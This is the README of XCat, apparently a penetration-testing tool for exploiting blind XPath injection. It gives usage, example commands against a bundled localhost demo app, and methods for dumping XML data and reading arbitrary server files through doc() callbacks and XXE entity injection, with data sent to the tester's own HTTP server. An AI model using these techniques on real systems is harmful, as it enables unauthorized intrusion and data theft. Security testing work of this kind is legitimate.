About XCat
==========

XCat is a command line program that aides in the exploitation of blind XPath injection vulnerabilities. It can be used
to retrieve the whole XML document being processed by a vulnerable XPath query, read arbitrary files on the hosts filesystem
and utilize out of bound HTTP requests to make the server send data directly to xcat.

XCat is built to exploit boolean XPath injections (Where only one bit of data can be extracted in one request)
and it requires you to manually identify the exploit first, this does not do that for you.

Features
--------
  - Exploits both GET and POST attacks
  - Extracts all nodes, comments, attributes and data from the entire XML document
  - Small and lightweight (only a few pure-python dependencies)
  - Parallel requests
  - XPath 2.0 supported (with graceful degrading to 1.0)
  - Advanced data postback through HTTP (see below)
  - Arbitrarily read XML files on the servers file system via the doc() function (see below)
  - Arbitrarily read text files on the servers file system via crafted SYSTEM entities


**Features planned for future releases:**

  - [Regex](http://www.w3.org/TR/xpath-functions/#func-matches) pattern matching to reduce character search space
  - [Unicode normalization](http://www.w3.org/TR/xpath-functions/#func-normalize-unicode)
  - Error based retrieval

Installation
------------
You can install XCat via pip: `pip install xcat`. You should then have an `xcat` command available. XCat comes with 
an example application you can test against, this can be found in the `example_application` directory. Check out it's 
readme file to see how to run it.


Examples
--------
If you run a windows machine you can install Jython and start the example application (example_application/ironpython_site.py).
The syntax for a simple command you can execute against this server is:

    xcat --method=GET http://localhost:8080 title=Foundation title "1 results found" run retrieve

This command specifies the HTTP method (GET), target URL (our localhost server), the GET or POST) data to send (title=Bible),
the vulnerable parameter (title) and a string to indicate a true response (Book found). Executing this will retrieve
the entire XML file being queried.

    >> xcat --method=GET http://localhost:8080 title=Foundation title "1 results found" run retrieve
    Injecting using FunctionCall
    Detecting features...
    Supported features: String to codepoints, XPath 2, Read local XML files, Substring search speedup
    Retrieving /*[1]
    <?xml version="1.0" encoding="utf-8"?>
    <library>
	    <rentals>
		    <books>
                <!-- A comment -->
                <book>
    ...

The the retrieval of documents can be sped up in a number of different ways, such as using the doc function to make the
server send data directly to XCat (explained in more detail below). Each of the techniques is called a feature and can
be viewed by using the `test_injection` command. This will display information about the injection, including the
type (integer, string, path name) and various features that XCat has is able to use. XCat knows which features
are best and will gracefully degrade if they fail for any reason.

    >> xcat --method=GET --public-ip="localhost" http://localhost:8080 title=Foundation title "1 results found" test_injection
    Testing parameter title:
    FunctionCallInjection:          /lib/something[function(?)]
        - EfficientSubstringSearch
        - OOBDocFeature
        - CodepointSearch
        - XPath2
        - DocFeature
        - EntityInjection

Usage
-----
Before specifying what data you want to extract from the injection you need to tell XCat how to exploit it. XCat can't
do this for you, so you have to do the initial hard work of finding a vulnerability. XCat needs a target URL it can
reach, URL encoded arguments, the vulnerable parameter and a string to match in the response. The initial data given
must be valid and trigger either a true or false response.

    >> xcat --help
    Usage: xcat [OPTIONS] TARGET ARGUMENTS TARGET_PARAMETER MATCH_STRING
                      COMMAND [ARGS]...

    Options:
      --method TEXT                   HTTP method to use
      --true                          match_string indicates a true response
      --false                         match_string indicates a false response
      --loglevel [debug|info|warn|error]
      --logfile FILENAME
      --public-ip TEXT                Public IP address to use with OOB
                                      connections (use 'autodetect' to auto-detect
                                      value)
      --help                          Show this message and exit.
    
    Commands:
      run
      test_injection  Test parameter for injectability

The two most useful commands are `run retrieve` and `run file_shell`. The first allows you to retrieve the whole document
being processed by the query in either XML or JSON format and specify a file for it to be dumped to.

    Usage: xcat run retrieve [OPTIONS]

    Attempt to retrieve the whole XML document

    Options:
      --query TEXT         Query to retrieve. Defaults to root node (/*[1])
      --output FILENAME    Location to output XML to
      --format [xml|json]  Format for output
      --help               Show this message and exit.

The second command takes no additional arguments but enables you to read arbitrary files on the filesystem. This only
works if the vulnerable parameter supports the doc feature (and optionally entity injection):

    >> xcat --method=GET --public-ip="localhost" http://localhost:8080 title=Foundation title "1 results found" run file_shell
    Injecting using FunctionCall
    Detecting features...
    Supported features: XPath 2, String to codepoints, External DOC function, Entity injection, Substring search speedup
    There are three ways to read files on the file system using XPath:
     1. doc: Reads valid XML files - does not support any other file type. Supports remote file URI's (http) and local ones.
     2. inject: Can read arbitrary text files as long as they do not contain any XML
    Type doc, inject or comment to switch modes. Defaults to inject
    Type uri to read the URI of the document being queried
    Note: The URI should have a protocol, e.g: file:///test.xml. Bad things may happen if the URI does not exist, and it is best to use absolute paths.
    >> uri
    URI: file:///C:/Users/x/xcat/src/example_application/input.xml
    >> file:///C:/Users/x/xcat/src/example_application/
    secret.txt
    secret.xml
    ...
    >> doc
    Switched to doc mode
    >> file:///C:/Users/x/xcat/src/example_application/secret.xml
    <?xml version="1.0" encoding="utf-8"?>
    <this_contains_xml>
        <node>
            hello
    ...
    >> inject
    Switched to inject mode
    >> file:///C:/Users/x/xcat/src/example_application/secret.txt
    This is a secret file. Do not read me!

There are also two other commands `simple` and `console` that will help you navigate larger XML file without having to get everything. They are very 
useful to have a quick overview of the XML document.

The `simple` command :

    >> xcat --method=GET --public-ip="localhost" http://localhost:8080 title=Foundation title "1 results found" run simple
    Injecting using FunctionCall
    Detecting features...
    Listening on 0
    Listening on 42292
    Supported features: Out of bounds HTTP, String to codepoints, Substring search speedup, Read local XML files, XPath 2, Read local text files
    Retrieving overview
    <?xml version="1.0" encoding="utf-8"?>
    <library>
	    3 text node
	    <rentals>
		    3 text node
		    <books>
			    <!--1 comment node-->
    

The `console` command will open an interactive shell :

    Injecting using FunctionCall
    Detecting features...
    Listening on 0
    Listening on 45470
    Supported features: Substring search speedup, Read local XML files, Read local text files, Out of bounds HTTP, String to codepoints, XPath 2
    Opening console
    /*[1] : 

The supported command of the shell are `ls`, `cd`, `attr`, `comment`, `content`, `name`.

 - `ls` - List the name of all the subnode.
 - `cd` - Change the current node. Use the value `..` to navigate back. To specify an absolute path start with a `/`.
 - `attr` - List the attributes of the current node.
 - `comment` - List of the comments node of the current node.
 - `content` - Return the content of the current node.
 - `name` - Return the node name of the current node. 

### Simple usage with the example application
Check out the [readme](src/example_application) to try out XCat with the provided example application.


HTTP Postback / doc function and entity injection
----------------------------

Possibly the most advanced feature of XCat is its 'HTTP postback' feature. The XPath 2.0 schema defines a function
called [doc](http://www.w3.org/TR/xpath-functions/#func-doc) which allows the programmer to load external documents
from the file system or even from a remote network resource via HTTP/HTTPS. If the doc function is enabled and working
then XCat will use it where possible to greatly speed up document retrieval times. It does this by running a small HTTP
server within the program which listens on a specified port and by then calling the doc() function with the currently
targeted node's data URI encoded and appended to a query. This means the XPath library will make a HTTP request to your
IP (requires the port to be forwarded and/or a public IP) in the following format similar to:

	http://YOUR_IP/?data=some%20data%20goes%here

This is far more efficient than iterating over the string character by character and can greatly reduce the retrieval times.

You can (ab)use this function to load XML file on the system, as long as you have read permissions over it, allowing
you to retrieve lots of lovely XML configuration files - you can jump into a pseudo-shell within XCat by using
the fileshell command (shown above) and enter the file path for an XML file.

This can be taken one step further by using entity injection to read arbitrary files on the file system. XCat does this
by starting a HTTP server and makes the vulnerable application load an XML file from it. This XML file contains crafted
DOCTYPE declarations that cause the application to include local files in the XML file as it is being parsed, the contents
of which can then be queried and sent back to XCat in another HTTP request.

[This OWASP wiki page](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing) covers XML entity
injection this technique in more detail.
